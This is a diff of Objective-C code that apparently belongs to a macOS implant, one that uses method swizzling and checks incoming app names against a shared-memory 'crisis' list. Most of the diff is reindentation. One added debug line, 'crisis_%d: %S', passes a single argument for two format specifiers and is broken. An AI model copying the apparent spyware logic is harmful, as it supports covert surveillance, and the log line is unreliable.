@@ -912,43 +912,43 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
   
   if (shMemCommand->command == AG_START &&
       shMemCommand->commandDataSize)
-  {
-    NSData *tmpListData = [[NSData alloc] initWithBytes: shMemCommand->commandData 
-                                                 length: shMemCommand->commandDataSize];
-    UInt32 numOfNames;
-    
-    [tmpListData getBytes: &numOfNames length: sizeof(UInt32)];
-    
-    char* tmpPtr = ((char*)[tmpListData bytes]) + sizeof(UInt32);
-    
-    for (int i=0; i < numOfNames; i++)
     {
-      int iLen = _utf16len((unichar*)tmpPtr)*sizeof(unichar);
-      NSString *tmpCrisisApp = [[NSString alloc] initWithBytes: tmpPtr 
-                                                        length: iLen 
-                                                      encoding: NSUTF16LittleEndianStringEncoding];
-      
-      
+      NSData *tmpListData = [[NSData alloc] initWithBytes: shMemCommand->commandData 
+                                                   length: shMemCommand->commandDataSize];
+      UInt32 numOfNames;
+
+      [tmpListData getBytes: &numOfNames length: sizeof(UInt32)];
+      char *tmpPtr = ((char *)[tmpListData bytes]) + sizeof(UInt32);
+
+      for (int i = 0; i < numOfNames; i++)
+        {
 #ifdef DEBUG_INPUT_MANAGER
-      infoLog(@"AppName %@", tmpCrisisApp);  
+          infoLog(@"crisis_%d: %S", (unichar *)tmpPtr);
 #endif
-      
-      if ([appName isCaseInsensitiveLike: tmpCrisisApp])
-      {
-        [tmpCrisisApp release];
-        retVal = YES;
-        break;
-      }
-      
-      [tmpCrisisApp release];
-      
-      tmpPtr += iLen;
-      tmpPtr += sizeof(unichar);
+          int iLen = _utf16len((unichar*)tmpPtr) * sizeof(unichar);
+          NSString *tmpCrisisApp = [[NSString alloc] initWithBytes: tmpPtr 
+                                                            length: iLen 
+                                                          encoding: NSUTF16LittleEndianStringEncoding];
+
+#ifdef DEBUG_INPUT_MANAGER
+          infoLog(@"AppName %@", tmpCrisisApp);  
+#endif
+
+          if ([appName isCaseInsensitiveLike: tmpCrisisApp])
+            {
+              [tmpCrisisApp release];
+              retVal = YES;
+              break;
+            }
+
+          [tmpCrisisApp release];
+
+          tmpPtr += iLen;
+          tmpPtr += sizeof(unichar);
+        }
     }
-  }
   
   [pool release];
-  
   return retVal;
 }
 
